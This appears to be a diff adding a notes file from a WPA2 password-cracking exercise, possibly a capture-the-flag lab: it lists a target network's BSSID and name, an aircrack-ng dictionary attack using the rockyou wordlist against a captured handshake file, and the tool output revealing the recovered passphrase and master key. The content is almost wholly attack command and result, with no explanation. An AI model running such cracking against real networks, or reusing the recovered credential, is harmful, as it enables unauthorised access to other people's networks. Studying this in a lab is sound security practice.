@@ -1,0 +1,27 @@
+BSSID: 02:1A:11:FF:D9:BD
+
+ESSID: 'James Honor 8'
+
+aircrack-ng -a2 -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt NinjaJc01-01.cap
+
+
+                               Aircrack-ng 1.6 
+
+      [00:00:19] 125078/14344392 keys tested (6629.73 k/s) 
+
+      Time left: 35 minutes, 45 seconds                          0.87%
+
+                        KEY FOUND! [ greeneggsandham ]
+
+
+      Master Key     : 71 5F 17 D1 D7 9E 70 4D 6E 2E 9C AD 46 F5 45 F5 
+                       AF 5E 43 48 16 F9 5B AA 14 8F 39 AA FC 5E EB 3B 
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 9A 6A 56 EE E4 4E 42 A3 14 71 26 9F E0 E2 93 04 
+
+
